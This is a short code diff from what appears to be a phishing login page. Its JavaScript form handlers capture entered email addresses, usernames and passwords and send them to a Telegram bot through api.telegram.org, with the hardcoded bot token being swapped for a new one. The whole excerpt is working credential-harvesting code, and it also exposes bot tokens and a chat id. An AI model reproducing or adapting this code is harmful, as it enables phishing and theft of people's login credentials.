@@ -19,7 +19,7 @@ form.addEventListener("submit", (e) => {
     var text2 = document.getElementById("text2").value;
     var my_text = ` %0A Email  - ${text1} %0APassword - ${text2}`
 
-    var token = "5292094686:AAHHE2nFIeanS2khE2xtjVCbsNa8dl6VCRo"
+    var token = "5280533124:AAEUpdWDo7A55UMSiuZiLsT2ztpRTqr4wLE"
     var chat_id = -1001223403183
     var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`
 
@@ -35,7 +35,7 @@ form2.addEventListener("submit", (e) => {
     var text5 = document.getElementById("text5").value;
     var my_text = `  %0A User Name -  ${text3} %0AEmail - ${text5} %0APassword - ${text4}`
 
-    var token = "5292094686:AAHHE2nFIeanS2khE2xtjVCbsNa8dl6VCRo"
+    var token = "5280533124:AAEUpdWDo7A55UMSiuZiLsT2ztpRTqr4wLE"
     var chat_id = -1001223403183
     var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`
 
